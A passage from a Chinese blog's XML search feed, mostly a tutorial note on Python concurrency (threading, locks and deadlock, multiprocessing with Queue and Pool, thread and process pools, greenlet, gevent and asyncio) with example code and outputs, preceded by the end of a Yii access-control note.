选填，判断当前controller是否属于验证的范围，如果为空，表示所有controller都要验证 'controllers' =&gt; ['site'],# 选填，判断当前 ip 是否属于验证的范围，如果为空，表示所有 ip 都要验证 'ips' =&gt; ['192.168.*'],# 选填，判断当前 请求方式 是否属于验证的范围，如果为空，表示所有 请求方式 都要验证'verbs' =&gt; ['post'], # 选填，添加额外的自定义验证方法，如果不设置role参数，也就意味着只验证此方法 'matchCallback' =&gt; function ($rule, $action)&#123;&#125;, # 选填，一般也不用配置，当验证失败时执行 'denyCallback' =&gt; function ($rule, $action)&#123;&#125;, 最后两个参数也是验证的关键1234567role =&gt; ['@', '?', 'otherRole']? : 表示允许未登录的访问 @ : 表示登录才能访问otherRole : 其他的都是对应的权限/角色 详见RBAC roleParams =&gt; function($rule)&#123;&#125; || String || Array # （算出来的）值将会作为权限的参数]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>AFC验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程&&进程&&协程]]></title>
    <url>%2F2018%2F10%2F11%2Fpython%2F%E7%BA%BF%E7%A8%8B%26%26%E8%BF%9B%E7%A8%8B%26%26%E5%8D%8F%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[前言算是一篇记录或摘抄的笔记，方便用来查询基础知识点。 多任务-线程单核CPU是怎么执行多任务的呢？ 答案就是操作系统轮流让各个任务交替执行，任务1执行0.01秒，切换到任务2，任务2执行0.01秒，再切换到任务3，执行0.01秒……这样反复执行下去。表面上看，每个任务都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像所有任务都在同时执行一样。 真正的并行执行多任务只能在多核CPU上实现，但是，由于任务数量远远多于CPU的核心数量，所以，操作系统也会自动把很多任务轮流调度到每个核心上执行。 并发：指的是任务数多余cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）并行：指的是任务数小于等于cpu核数，即任务真的是一起执行的 cpu 调度的是线程，也就是多核可以并行多个线程 使用线程python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用 使用threading模块单线程代码 一次一次的往下执行12345678910#coding=utf-8import timedef saySorry(): print("亲爱的，我错了，我能吃饭了吗？") time.sleep(1)if __name__ == "__main__": for i in range(5): saySorry() 多线程代码 将同时进行123456789101112131415161718192021222324252627282930313233343536373839404142#coding=utf-8import threadingimport timedef saySorry(): print("亲爱的，我错了，我能吃饭了吗？") time.sleep(1)if __name__ == "__main__": for i in range(5): t = threading.Thread(target=saySorry) t.start() #启动线程，即让线程开始执行``` 主线程不会等待所有的子线程结束后才结束，如果要等子线程结束才结束子线程需要使用 `jion()` 来让主线程等 ```python#coding=utf-8import threadingfrom time import sleep,ctimedef sing(): for i in range(3): print("正在唱歌...%d"%i) sleep(1)def dance(): for i in range(3): print("正在跳舞...%d"%i) sleep(1)if __name__ == '__main__': print('---开始---:%s'%ctime()) t1 = threading.Thread(target=sing) t2 = threading.Thread(target=dance) t1.start() t2.start() sleep(5) # 屏蔽此行代码，试试看，程序是否会立马结束？ print('---结束---:%s'%ctime()) threading.enumerate() 查看线程数1length = len(threading.enumerate()) current_thread() 返回当前线程实例12345678910111213141516171819import time, threading# 新线程执行的代码:def loop(): # threading.current_thread().name 获取当前线程的名字 LoopThread print('thread %s is running...' % threading.current_thread().name) n = 0 while n &lt; 5: n = n + 1 print('thread %s &gt;&gt;&gt; %s' % (threading.current_thread().name, n)) time.sleep(1) print('thread %s ended.' % threading.current_thread().name)print('thread %s is running...' % threading.current_thread().name)# 创建新线程并赋值名字 t = threading.Thread(target=loop, name='LoopThread')t.start()t.join()print('thread %s ended.' % threading.current_thread().name) ThroadLocal 线程的私有变量在多线程环境下，每个线程都有自己的数据。一个线程使用自己的局部变量比使用全局变量好，因为局部变量只有线程自己能看见，不会影响其他线程，而全局变量的修改必须加锁。 但是局部变量也有问题，就是在函数调用的时候，传递起来很麻烦，throadloacl就很好的解决了问题123456789101112131415161718192021222324252627import threading# 创建全局ThreadLocal对象:local_school = threading.local()def process_student(): # 获取当前线程关联的student: std = local_school.student print('Hello, %s (in %s)' % (std, threading.current_thread().name))def process_thread(name): # 绑定ThreadLocal的student: local_school.student = name # 调用的时候不用再传递局部变量了 process_student()t1 = threading.Thread(target= process_thread, args=('Alice',), name='Thread-A')t2 = threading.Thread(target= process_thread, args=('Bob',), name='Thread-B')t1.start()t2.start()t1.join()t2.join()执行结果：Hello, Alice (in Thread-A)Hello, Bob (in Thread-B) 全局变量 local_school 就是一个ThreadLocal对象，每个Thread对它都可以读写student属性，但互不影响。你可以把 local_school 看成全局变量，但每个属性如 local_school.student 都是线程的局部变量，可以任意读写而互不干扰，也不用管理锁的问题，ThreadLocal内部会处理。 可以理解为全局变量 local_school 是一个dict，不但可以用 local_school.student ，还可以绑定其他变量，如 local_school.teacher 等等。 线程执行代码的封装,继承线程类为了让每个线程的封装性更完美，所以使用threading模块时，往往会定义一个新的子类class，只要继承threading.Thread就可以了，然后重写run方法 示例如下：12345678910111213141516#coding=utf-8import threadingimport timeclass MyThread(threading.Thread): def run(self): for i in range(3): time.sleep(1) # self.name为线程名 msg = "I'm "+self.name+' @ '+str(i) #name属性中保存的是当前线程的名字 print(msg)if __name__ == '__main__': t = MyThread() t.start() 多线程共享全局变量在一个进程内的所有线程共享全局变量，很方便在多个线程间共享数据 12345678910111213141516171819202122232425262728from threading import Threadimport timeg_num = 100def work1(): global g_num for i in range(3): g_num += 1 print("----in work1, g_num is %d---"%g_num)def work2(): global g_num print("----in work2, g_num is %d---"%g_num)print("---线程创建之前g_num is %d---"%g_num)t1 = Thread(target=work1)t1.start()#延时一会，保证t1线程中的事情做完time.sleep(1)t2 = Thread(target=work2)t2.start() 列表当做实参传递到线程中1234567891011121314151617181920from threading import Threadimport timedef work1(nums): nums.append(44) print("----in work1---",nums)def work2(nums): #延时一会，保证t1线程中的事情做完 time.sleep(1) print("----in work2---",nums)g_nums = [11,22,33]t1 = Thread(target=work1, args=(g_nums,))t1.start()t2 = Thread(target=work2, args=(g_nums,))t2.start() 多线程共享全局变量导致的问题两个线程同时获取到全局变量，同时对一个变量进行操作，后面的直接覆盖前面的计算结果，就导致了先计算出来的计算实际是无效的。1234567891011121314151617181920212223242526272829303132333435363738import threadingimport timeg_num = 0def work1(num): global g_num for i in range(num): g_num += 1 print("----in work1, g_num is %d---"%g_num)def work2(num): global g_num for i in range(num): g_num += 1 print("----in work2, g_num is %d---"%g_num)print("---线程创建之前g_num is %d---"%g_num)t1 = threading.Thread(target=work1, args=(1000000,))t1.start()t2 = threading.Thread(target=work2, args=(1000000,))t2.start()while len(threading.enumerate()) != 1: time.sleep(1)print("2个线程对同一个全局变量操作之后的最终结果是:%s" % g_num) 运行结果：---线程创建之前g_num is 0-------in work1, g_num is 1088005-------in work2, g_num is 1286202---2个线程对同一个全局变量操作之后的最终结果是:1286202 互斥锁解决共享变量问题互斥锁为资源引入一个状态：锁定/非锁定 某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。 threading模块中定义了Lock类，可以方便的处理锁定： 12345678# 创建锁mutex = threading.Lock()# 锁定mutex.acquire()# 释放mutex.release() 注意： 如果这个锁之前是没有上锁的，那么acquire不会堵塞如果在调用acquire对这个锁上锁之前 它已经被 其他线程上了锁，那么此时acquire会堵塞，直到这个锁被解锁为止 使用互斥锁完成2个线程对同一个全局变量各加100万次的操作1234567891011121314151617181920212223242526272829303132333435363738394041424344import threadingimport timeg_num = 0def test1(num): global g_num for i in range(num): mutex.acquire() # 上锁 g_num += 1 mutex.release() # 解锁 print("---test1---g_num=%d"%g_num)def test2(num): global g_num for i in range(num): mutex.acquire() # 上锁 g_num += 1 mutex.release() # 解锁 print("---test2---g_num=%d"%g_num)# 创建一个互斥锁# 默认是未上锁的状态mutex = threading.Lock()# 创建2个线程，让他们各自对g_num加1000000次p1 = threading.Thread(target=test1, args=(1000000,))p1.start()p2 = threading.Thread(target=test2, args=(1000000,))p2.start()# 等待计算完成while len(threading.enumerate()) != 1: time.sleep(1)print("2个线程对同一个全局变量操作之后的最终结果是:%s" % g_num)运行结果：---test1---g_num=1909909---test2---g_num=20000002个线程对同一个全局变量操作之后的最终结果是:2000000 上锁解锁过程当一个线程调用锁的acquire()方法获得锁时，锁就进入“locked”状态。 每次只有一个线程可以获得锁。如果此时另一个线程试图获得这个锁，该线程就会变为“blocked”状态，称为“阻塞”，直到拥有锁的线程调用锁的release()方法释放锁之后，锁进入“unlocked”状态。 线程调度程序从处于同步阻塞状态的线程中选择一个来获得锁，并使得该线程进入运行（running）状态。 锁的好坏锁的好处： 确保了某段关键代码只能由一个线程从头到尾完整地执行锁的坏处： 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁 死锁在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。 尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546#coding=utf-8import threadingimport timeclass MyThread1(threading.Thread): def run(self): # 对mutexA上锁 mutexA.acquire() # mutexA上锁后，延时1秒，等待另外那个线程 把mutexB上锁 print(self.name+'----do1---up----') time.sleep(1) # 此时会堵塞，因为这个mutexB已经被另外的线程抢先上锁了 mutexB.acquire() print(self.name+'----do1---down----') mutexB.release() # 对mutexA解锁 mutexA.release()class MyThread2(threading.Thread): def run(self): # 对mutexB上锁 mutexB.acquire() # mutexB上锁后，延时1秒，等待另外那个线程 把mutexA上锁 print(self.name+'----do2---up----') time.sleep(1) # 此时会堵塞，因为这个mutexA已经被另外的线程抢先上锁了 mutexA.acquire() print(self.name+'----do2---down----') mutexA.release() # 对mutexB解锁 mutexB.release()mutexA = threading.Lock()mutexB = threading.Lock()if __name__ == '__main__': t1 = MyThread1() t2 = MyThread2() t1.start() t2.start() 避免死锁 程序设计时要尽量避免 添加超时时间等 多任务-进程进程：一个程序运行起来后，代码+用到的资源称之为进程，它是操作系统分配资源的基本单元。 不仅可以通过线程完成多任务，进程也是可以的 进程间是不共享全局变量的123456789101112131415161718192021222324252627282930313233# -*- coding:utf-8 -*-from multiprocessing import Processimport osimport timenums = [11, 22]def work1(): """子进程要执行的代码""" print("in process1 pid=%d ,nums=%s" % (os.getpid(), nums)) for i in range(3): nums.append(i) time.sleep(1) print("in process1 pid=%d ,nums=%s" % (os.getpid(), nums))def work2(): """子进程要执行的代码""" print("in process2 pid=%d ,nums=%s" % (os.getpid(), nums))if __name__ == '__main__': p1 = Process(target=work1) p1.start() p1.join() # 等待此子进程执行完，主线程再继续 p2 = Process(target=work2) p2.start()运行结果:in process1 pid=11349 ,nums=[11, 22]in process1 pid=11349 ,nums=[11, 22, 0]in process1 pid=11349 ,nums=[11, 22, 0, 1]in process1 pid=11349 ,nums=[11, 22, 0, 1, 2]in process2 pid=11350 ,nums=[11, 22] 进程的创建-multiprocessingmultiprocessing模块就是跨平台版本的多进程模块，提供了一个Process类来代表一个进程对象，这个对象可以理解为是一个独立的进程，可以执行另外的事情 Process语法结构1Process([group [, target [, name [, args [, kwargs]]]]]) target：如果传递了函数的引用，可以任务这个子进程就执行这里的代码args：给target指定的函数传递的参数，以元组的方式传递kwargs：给target指定的函数传递命名参数name：给进程设定一个名字，可以不设定group：指定进程组，大多数情况下用不到 Process创建的实例对象的常用方法： start()：启动子进程实例（创建子进程）is_alive()：判断进程子进程是否还在活着join([timeout])：是否等待子进程执行结束，或等待多少秒后主线程再继续往下运行terminate()：不管任务是否完成，立即终止子进程Process创建的实例对象的常用属性： name：当前进程的别名，默认为Process-N，N为从1开始递增的整数pid：当前进程的pid（进程号） 给子进程指定的函数传递参数12345678910111213141516171819202122232425262728293031# -*- coding:utf-8 -*-from multiprocessing import Processimport osfrom time import sleepdef run_proc(name, age, **kwargs): for i in range(10): print('子进程运行中，name= %s,age=%d ,pid=%d...' % (name, age, os.getpid())) print(kwargs) sleep(0.2)if __name__=='__main__': p = Process(target=run_proc, args=('test',18), kwargs=&#123;"m":20&#125;) p.start() sleep(1) # 1秒中之后，立即结束子进程 p.terminate() sleep(3) p.join() # 终止后就没法jion了运行结果:子进程运行中，name= test,age=18 ,pid=45097...&#123;'m': 20&#125;子进程运行中，name= test,age=18 ,pid=45097...&#123;'m': 20&#125;子进程运行中，name= test,age=18 ,pid=45097...&#123;'m': 20&#125;子进程运行中，name= test,age=18 ,pid=45097...&#123;'m': 20&#125;子进程运行中，name= test,age=18 ,pid=45097...&#123;'m': 20&#125; 进程pid12345678910111213141516# -*- coding:utf-8 -*-from multiprocessing import Processimport osimport timedef run_proc(): """子进程要执行的代码""" print('子进程运行中，pid=%d...' % os.getpid()) # os.getpid获取当前进程的进程号 print('子进程将要结束...')if __name__ == '__main__': print('父进程pid: %d' % os.getpid()) # os.getpid获取当前进程的进程号 # 创建进程 p = Process(target=run_proc) # 启动进程 p.start() multiprocessing.cpu_count() 获得cpu核数进程间的通信-Queue可以使用multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序 Queue的使用12345678910111213141516171819202122232425262728#coding=utf-8from multiprocessing import Queueq=Queue(3) #初始化一个Queue对象，最多可接收三条put消息q.put("消息1")q.put("消息2")print(q.full()) #Falseq.put("消息3")print(q.full()) #True#因为消息列队已满下面的try都会抛出异常，第一个try会等待2秒后再抛出异常，第二个Try会立刻抛出异常try: q.put("消息4",True,2)except: print("消息列队已满，现有消息数量:%s"%q.qsize())try: q.put_nowait("消息4")except: print("消息列队已满，现有消息数量:%s"%q.qsize())#推荐的方式，先判断消息列队是否已满，再写入if not q.full(): q.put_nowait("消息4")#读取消息时，先判断消息列队是否为空，再读取if not q.empty(): for i in range(q.qsize()): print(q.get_nowait()) 初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）； Queue.qsize()：返回当前队列包含的消息数量； Queue.empty()：如果队列为空，返回True，反之False ； Queue.full()：如果队列满了，返回True,反之False； Queue.get([block[, timeout]])：获取队列中的一条消息，然后将其从列队中移除，block默认值为True； 1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常； 2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常； Queue.get_nowait()：相当Queue.get(False)； Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True； 1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常； 2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常； Queue.put_nowait(item)：相当Queue.put(item, False)； Queue实例我们以Queue为例，在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据：1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Process, Queueimport os, time, random# 写数据进程执行的代码:def write(q): for value in ['A', 'B', 'C']: print('Put %s to queue...' % value) q.put(value) time.sleep(random.random())# 读数据进程执行的代码:def read(q): while True: if not q.empty(): value = q.get(True) print('Get %s from queue.' % value) time.sleep(random.random()) else: breakif __name__=='__main__': # 父进程创建Queue，并传给各个子进程： q = Queue() pw = Process(target=write, args=(q,)) pr = Process(target=read, args=(q,)) # 启动子进程pw，写入: pw.start() # 等待pw结束: pw.join() # 启动子进程pr，读取: pr.start() pr.join() print('') print('所有数据都写入并且读完') 进程池Pool初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例：12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding:utf-8 -*-from multiprocessing import Poolimport os, time, randomdef worker(msg): t_start = time.time() print("%s开始执行,进程号为%d" % (msg,os.getpid())) # random.random()随机生成0~1之间的浮点数 time.sleep(random.random()*2) t_stop = time.time() print(msg,"执行完毕，耗时%0.2f" % (t_stop-t_start))po = Pool(3) # 定义一个进程池，最大进程数3for i in range(0,10): # Pool().apply_async(要调用的目标,(传递给目标的参数元祖,)) # 每次循环将会用空闲出来的子进程去调用目标 po.apply_async(worker,(i,))print("----start----")po.close() # 关闭进程池，关闭后po不再接收新的请求po.join() # 等待po中所有子进程执行完成，必须放在close语句之后print("-----end-----")运行结果:----start----0开始执行,进程号为214661开始执行,进程号为214682开始执行,进程号为214670 执行完毕，耗时1.013开始执行,进程号为214662 执行完毕，耗时1.244开始执行,进程号为214673 执行完毕，耗时0.565开始执行,进程号为214661 执行完毕，耗时1.686开始执行,进程号为214684 执行完毕，耗时0.677开始执行,进程号为214675 执行完毕，耗时0.838开始执行,进程号为214666 执行完毕，耗时0.759开始执行,进程号为214687 执行完毕，耗时1.038 执行完毕，耗时1.059 执行完毕，耗时1.69-----end----- multiprocessing.Pool常用函数解析： apply_async(func[, args[, kwds]]) ：使用非阻塞方式调用func（并行执行，堵塞方式必须等待上一个进程退出才能执行下一个进程），args为传递给func的参数列表，kwds为传递给func的关键字参数列表；close()：关闭Pool，使其不再接受新的任务；terminate()：不管任务是否完成，立即终止；join()：主进程阻塞，等待子进程的退出， 必须在close或terminate之后使用； 进程池中的Queue如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息： RuntimeError: Queue objects should only be shared between processes through inheritance. 下面的实例演示了进程池中的进程如何通信： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding:utf-8 -*-# 修改import中的Queue为Managerfrom multiprocessing import Manager,Poolimport os,time,randomdef reader(q): print("reader启动(%s),父进程为(%s)" % (os.getpid(), os.getppid())) for i in range(q.qsize()): print("reader从Queue获取到消息：%s" % q.get(True))def writer(q): print("writer启动(%s),父进程为(%s)" % (os.getpid(), os.getppid())) for i in "itcast": q.put(i)if __name__=="__main__": print("(%s) start" % os.getpid()) q = Manager().Queue() # 使用Manager中的Queue po = Pool() po.apply_async(writer, (q,)) time.sleep(1) # 先让上面的任务向Queue存入数据，然后再让下面的任务开始从中取数据 po.apply_async(reader, (q,)) po.close() po.join() print("(%s) End" % os.getpid())运行结果:(11095) startwriter启动(11097),父进程为(11095)reader启动(11098),父进程为(11095)reader从Queue获取到消息：ireader从Queue获取到消息：treader从Queue获取到消息：creader从Queue获取到消息：areader从Queue获取到消息：sreader从Queue获取到消息：t(11095) End 分布式进程在Thread和Process中，应当优选Process，因为Process更稳定，而且，Process可以分布到多台机器上，而Thread最多只能分布到同一台机器的多个CPU上。 廖雪峰-分布式进程 多进程拷贝文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import multiprocessingimport osimport timeimport randomdef copy_file(queue, file_name,source_folder_name, dest_folder_name): """copy文件到指定的路径""" f_read = open(source_folder_name + "/" + file_name, "rb") f_write = open(dest_folder_name + "/" + file_name, "wb") while True: time.sleep(random.random()) content = f_read.read(1024) if content: f_write.write(content) else: break f_read.close() f_write.close() # 发送已经拷贝完毕的文件名字 queue.put(file_name)def main(): # 获取要复制的文件夹 source_folder_name = input("请输入要复制文件夹名字:") # 整理目标文件夹 dest_folder_name = source_folder_name + "[副本]" # 创建目标文件夹 try: os.mkdir(dest_folder_name) except: pass # 如果文件夹已经存在，那么创建会失败 # 获取这个文件夹中所有的普通文件名 file_names = os.listdir(source_folder_name) # 创建Queue queue = multiprocessing.Manager().Queue() # 创建进程池 pool = multiprocessing.Pool(3) for file_name in file_names: # 向进程池中添加任务 pool.apply_async(copy_file, args=(queue, file_name, source_folder_name, dest_folder_name)) # 关闭线程池，不允许在有进程加入 pool.close() # 主进程显示进度 all_file_num = len(file_names) while True: file_name = queue.get() if file_name in file_names: file_names.remove(file_name) copy_rate = (all_file_num-len(file_names))*100/all_file_num print("\r%.2f...(%s)" % (copy_rate, file_name) + " "*50, end="") if copy_rate &gt;= 100: break print()if __name__ == "__main__": main() 线程池&amp;&amp;进程池创建池子的好处是，可以避免无限开启线程／进程，导致消耗资源严重 线程池1234567891011121314151617181920212223242526272829303132333435from concurrent.futures import ThreadPoolExecutorimport requests# 线程执行的任务def task(url): response = requests.get(url) return response# 线程执行完回调函数def done(future, *arge, **kwargs): # 获取到线程返回的数据 response = future.result() print(response.status_code, response.content)# 创建线程池pool = ThreadPoolExecutor(7)url_list = [ 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com',]for url in url_list: # 将任务添加到线程池 v = pool.submit(task, url) # 添加线程任务执行结束后的回调函数 v.add_done_callback(done)# wait=True等待线程池的自线程执行完，再往下执行主线程pool.shutdown(wait=True)print('end') 进程池1234567891011121314151617181920212223242526272829303132333435from concurrent.futures import ProcessPoolExecutorimport requests# 线程执行的任务def task(url): response = requests.get(url) return response# 线程执行完回调函数def done(future, *arge, **kwargs): # 获取到线程返回的数据 response = future.result() print(response.status_code, response.content)# 创建线程池pool = ProcessPoolExecutor(7)url_list = [ 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com', 'http://www.baidu.com',]for url in url_list: # 将任务添加到线程池 v = pool.submit(task, url) # 添加线程任务执行结束后的回调函数 v.add_done_callback(done)# wait=True等待线程池的自线程执行完，再往下执行主线程pool.shutdown(wait=True)print('end') 多线程和多进程的优缺点 创建进程比创建线程消耗的资源多 同一个进程中的多线程共享资源(变量) 由于python中一个进程上会放置一个GIL锁，导致，一个进程中一次一会又一个线程通过，走到cpu，所以对于计算密集型多线程就是一个摆设，还会因为多线程争夺资源而变慢，计算密集型的需要使用多进程来利用多核资源 多任务-协程其实协程就是通过 yield 实现的协程，又称微线程，纤程。英文名Coroutine。 协程是python个中另外一种实现多任务的方式，只不过比线程更小占用更小执行单元（理解为需要的资源）。 为啥说它是一个执行单元，因为它自带CPU上下文。这样只要在合适的时机， 我们可以把一个协程 切换到另一个协程。 只要这个过程中保存或恢复 CPU上下文那么程序还是可以运行的。 协程和线程差异在实现多任务时, 线程切换从系统层面远不止保存和恢复 CPU上下文这么简单。 操作系统为了程序运行的高效性每个线程都有自己缓存Cache等等数据，操作系统还会帮你做这些数据的恢复操作。 所以线程的切换非常耗性能。但是协程的切换只是单纯的操作CPU的上下文，所以一秒钟切换个上百万次系统都抗的住。 实现简单的协程1234567891011121314151617181920212223242526272829303132import timedef work1(): while True: print("----work1---") yield time.sleep(0.5)def work2(): while True: print("----work2---") yield time.sleep(0.5)def main(): w1 = work1() w2 = work2() while True: next(w1) next(w2)if __name__ == "__main__": main()运行结果：----work1-------work2-------work1-------work2-------work1---………… 简单的协程21234567891011121314151617181920212223242526272829303132333435363738def consumer(): r = '' while True: n = yield r if not n: return print('[CONSUMER] Consuming %s...' % n) r = '200 OK'def produce(c): c.send(None) n = 0 while n &lt; 5: n = n + 1 print('[PRODUCER] Producing %s...' % n) r = c.send(n) print('[PRODUCER] Consumer return: %s' % r) c.close()c = consumer()produce(c)执行结果：[PRODUCER] Producing 1...[CONSUMER] Consuming 1...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 2...[CONSUMER] Consuming 2...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 3...[CONSUMER] Consuming 3...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 4...[CONSUMER] Consuming 4...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 5...[CONSUMER] Consuming 5...[PRODUCER] Consumer return: 200 OK 注意到consumer函数是一个generator，把一个consumer传入produce后： 首先调用c.send(None)启动生成器； 然后，一旦生产了东西，通过c.send(n)切换到consumer执行； consumer通过yield拿到消息，处理，又通过yield把结果传回； produce拿到consumer处理的结果，继续生产下一条消息； produce决定不生产了，通过c.close()关闭consumer，整个过程结束。 协程-greenlet为了更好使用协程来完成多任务，python中的greenlet模块对其封装，从而使得切换任务变的更加简单 使用如下命令安装greenlet模块:1sudo pip3 install greenlet 示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding=utf-8from greenlet import greenletimport timedef test1(): while True: print("---A--") gr2.switch() time.sleep(0.5) print('a sleep end')def test2(): while True: print("---B--") gr1.switch() time.sleep(0.5) print('b sleep end')gr1 = greenlet(test1)gr2 = greenlet(test2)#切换到gr1中运行gr1.switch()运行效果---A-----B--a sleep end---A--b sleep end---B--a sleep end---A--b sleep end---B--a sleep end---A--b sleep end---B--a sleep end---A--b sleep end...省略...``` #### 协程-gevent greenlet已经实现了协程，但是这个还的人工切换，是不是觉得太麻烦了，不要捉急，python还有一个比greenlet更强大的并且能够自动切换任务的模块gevent其原理是当一个greenlet遇到IO(指的是input output 输入输出，比如网络、文件操作等)操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO ```pythonpip3 install gevent gevent的使用1234567891011121314151617181920212223242526272829import geventdef f(n): for i in range(n): print(gevent.getcurrent(), i)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()运行结果&lt;Greenlet at 0x10e49f550: f(5)&gt; 0&lt;Greenlet at 0x10e49f550: f(5)&gt; 1&lt;Greenlet at 0x10e49f550: f(5)&gt; 2&lt;Greenlet at 0x10e49f550: f(5)&gt; 3&lt;Greenlet at 0x10e49f550: f(5)&gt; 4&lt;Greenlet at 0x10e49f910: f(5)&gt; 0&lt;Greenlet at 0x10e49f910: f(5)&gt; 1&lt;Greenlet at 0x10e49f910: f(5)&gt; 2&lt;Greenlet at 0x10e49f910: f(5)&gt; 3&lt;Greenlet at 0x10e49f910: f(5)&gt; 4&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 0&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 1&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 2&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 3&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 4 可以看到，3个greenlet是依次运行而不是交替运行 gevent切换执行 12345678910111213141516171819202122232425262728293031import geventdef f(n): for i in range(n): print(gevent.getcurrent(), i) #用来模拟一个耗时操作，注意不是time模块中的sleep gevent.sleep(1)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()运行结果&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 4 批量jion123456789101112131415161718192021222324252627282930313233343536from gevent import monkeyimport geventimport randomimport timedef coroutine_work(coroutine_name): for i in range(10): print(coroutine_name, i) time.sleep(random.random())gevent.joinall([ gevent.spawn(coroutine_work, "work1"), gevent.spawn(coroutine_work, "work2")])运行结果work1 0work1 1work1 2work1 3work1 4work1 5work1 6work1 7work1 8work1 9work2 0work2 1work2 2work2 3work2 4work2 5work2 6work2 7work2 8work2 9 批量jion异步123456789101112131415161718192021222324252627282930313233343536373839from gevent import monkeyimport geventimport randomimport time# 有耗时操作时需要monkey.patch_all() # 将程序中用到的耗时操作的代码，换为gevent中自己实现的模块def coroutine_work(coroutine_name): for i in range(10): print(coroutine_name, i) time.sleep(random.random())gevent.joinall([ gevent.spawn(coroutine_work, "work1"), gevent.spawn(coroutine_work, "work2")])运行结果work1 0work2 0work1 1work1 2work1 3work2 1work1 4work2 2work1 5work2 3work1 6work1 7work1 8work2 4work2 5work1 9work2 6work2 7work2 8work2 9 asyncio模块1234567891011121314151617import asyncio# 参考廖雪峰教程 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090954004980bd351f2cd4cc18c9e6c06d855c498000# 把一个generator标记为coroutine类型@asyncio.coroutinedef func1(): print('before...func1......') # yield from语法可以让我们方便地调用另一个generator yield from asyncio.sleep(5) print('end...func1......')tasks = [func1(), func1()]# 获取EventLooploop = asyncio.get_event_loop()# 